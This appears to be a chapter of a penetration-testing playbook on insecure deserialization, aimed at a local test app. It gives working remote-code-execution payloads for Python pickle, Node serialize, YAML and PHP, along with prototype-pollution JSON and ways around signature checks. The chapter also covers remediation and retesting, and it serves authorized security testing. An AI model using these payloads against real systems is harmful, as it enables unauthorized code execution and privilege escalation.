# 09 — Deserialization and Parsers

## 1. Scope and preconditions

The app accepts serialized objects, signed cookies, YAML, XML, pickle, Java serialization, or a structured import. Deserialization can turn a data field into code execution. Test with a harmless marker command (`id`, `hostname`) and stop at proof.

```bash
TARGET="http://127.0.0.1:5001"
OUT=".redteam/evidence/deser"
mkdir -p "$OUT"
```

## 2. Required Test Identities and seeded data

User A for authenticated imports and cookies; admin for admin-only import features. Seed one serialized object or export file per identity so the format is known and the baseline is stable.

## 3. Enumeration

Look for serialized blobs in cookies, hidden fields, import endpoints, queue messages, cache values, and API bodies:

```bash
curl -sS -b "$OUT/cookies_a.txt" "$TARGET/api/me" | tee "$OUT/me.json"
grep -RInE 'pickle|unserialize|readObject|ObjectInputStream|yaml.load|BinaryFormatter|node-serialize|XMLDecoder' \
  "$TARGET" 2>/dev/null | head -50
```

Fingerprints:

| Format | Marker |
|---|---|
| Java serialization | `rO0AB` after base64 decode, or `AC ED 00 05` in hex |
| PHP serialize | `O:`, `a:`, `s:` in the value |
| Python pickle | `gASV`, `gAJ`, or `\x80\x04` |
| .NET BinaryFormatter | `AAEAAAD/////` after base64 decode |
| Node serialize | `_$$ND_FUNC$$_` |
| YAML | `!!python/`, `!ruby/object`, anchors and tags |

## 4. Test cases

| # | Test | Exact request / command | Signal |
|---|---|---|---|
| 1 | Format fingerprint | Decode the cookie/body and match the table above | Known unsafe format |
| 2 | Python pickle | Generate the payload below, send it to the import endpoint | `id` output or marker file |
| 3 | PHP object injection | Send `O:4:"User":2:{s:4:"role";s:5:"admin";s:4:"name";s:1:"a";}` | Role changed or magic method runs |
| 4 | Java deserialization | Send a base64 Java stream to the endpoint; use `ysoserial` only if locally available and the target version matches | Callback or command output |
| 5 | Node serialize | `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}"}` | Command output |
| 6 | YAML unsafe load | `!!python/object/apply:os.system ["id"]` in a YAML import | Command output |
| 7 | XMLDecoder | `<java><object class="java.lang.Runtime" method="getRuntime">...</object></java>` | Command or file read |
| 8 | .NET ViewState | Decode the ViewState; check whether `__VIEWSTATEENCRYPTED` is absent and MAC is disabled | Forged ViewState accepted |
| 9 | Signed cookie confusion | Flip a byte in the cookie; check whether the app trusts the decoded object | Tampered object accepted |
| 10 | JSON object injection | `{"__proto__":{"isAdmin":true}}` or `{"constructor":{"prototype":{"isAdmin":true}}}` | Privilege change in the client or server |
| 11 | Parser differential | Send duplicate keys, `null`, arrays, and type confusion (`"1"` vs `1`) | Auth or validation bypass |
| 12 | Queue / cache object | Inject a serialized object into a local queue or cache key | Worker executes or deserializes it |

### Python pickle proof

```bash
python3 - <<'PY' > "$OUT/pickle.b64"
import base64, pickle, os
class P:
    def __reduce__(self):
        return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(P())).decode())
PY
curl -sS -X POST "$TARGET/api/import" -H 'Content-Type: application/octet-stream' \
  --data-binary @"$OUT/pickle.b64"
```

If the app expects base64 inside JSON, adjust the wrapper, not the payload.

### Java detection

```bash
printf '%s' "$COOKIE_VALUE" | base64 -d | xxd | head -2
# AC ED 00 05 = Java serialization stream
```

Use `ysoserial` only if it is already installed locally, the target library/version matches, and the ROE allows it. Prefer a `URLDNS`-style harmless gadget that triggers a local listener. Never download a gadget chain from the internet mid-engagement.

## 5. Bypass variants

- Encoding: base64, gzip, hex, URL encoding, nested serialization.
- Signed wrappers: re-sign with a leaked key, length-extension, `alg: none`.
- Magic-method chains: PHP `__wakeup`, `__destruct`, `__toString`; Java `readObject`; Python `__reduce__`.
- Parser quirks: duplicate keys, NaN/Infinity, type coercion, Unicode normalization.
- ViewState: disabled MAC, known machine key, path traversal in `__VIEWSTATE`.
- YAML tags: `!!python/object`, `!!ruby/object`, custom constructors.
- Polyglots: a file that is valid JSON and valid pickle/YAML.

## 6. Evidence to capture

- The serialized payload (redacted if it contains secrets) and the endpoint.
- The command output or marker proving execution.
- The library and version fingerprint.
- The callback log for blind cases.
- The before/after state for object injection.

## 7. False-positive traps

- A base64 cookie may be encrypted, not serialized. Decoding it to garbage is not a finding.
- A `rO0AB` prefix may be a test fixture or a harmless session object. Prove execution, not format alone.
- A YAML parser may use `safe_load`; the payload will error, which is a pass.
- A `.NET` ViewState may be encrypted and MACed; absence of a readable blob is not a bypass.
- A 500 on a malformed payload may be a parser error, not code execution.

## 8. Severity guidance

| Finding | Typical severity | CWE / WSTG |
|---|---|---|
| Pickle / Java RCE | Critical | CWE-502, WSTG-INPV-11 |
| PHP object injection to RCE | Critical | CWE-502 |
| Node serialize RCE | Critical | CWE-502 |
| YAML unsafe load RCE | Critical | CWE-502 |
| ViewState forgery | High to Critical | CWE-502, CWE-345 |
| Signed cookie tampering | High | CWE-565, CWE-502 |
| Prototype pollution to authz | High | CWE-1321 |
| Parser type confusion | Medium | CWE-843 |

## 9. Remediation patterns

- Never deserialize untrusted input. Use JSON with a strict schema and no executable types.
- If a serialized format is required, use a safe subset, sign and encrypt it, and verify before parsing.
- Replace `pickle`, `yaml.load`, `unserialize`, `readObject`, and `BinaryFormatter` with safe alternatives.
- Pin parser libraries and disable dangerous features (external entities, custom tags, type metadata).
- Enforce integrity with a server-side key and a modern MAC; never rely on obscurity.

## 10. Retest procedure

Replay the exact payload. Expect a safe parse error or a rejected request, with no command output or marker. Replay the signed-cookie tamper and the parser type-confusion variants. Confirm the library no longer accepts the dangerous format.

## Resources

- OWASP WSTG: WSTG-INPV-11.
- OWASP Cheat Sheet: Deserialization, Input Validation.
- CWE-502, CWE-565, CWE-843, CWE-1321.
- PortSwigger Academy: insecure deserialization labs.
- HackTricks: deserialization payload references.
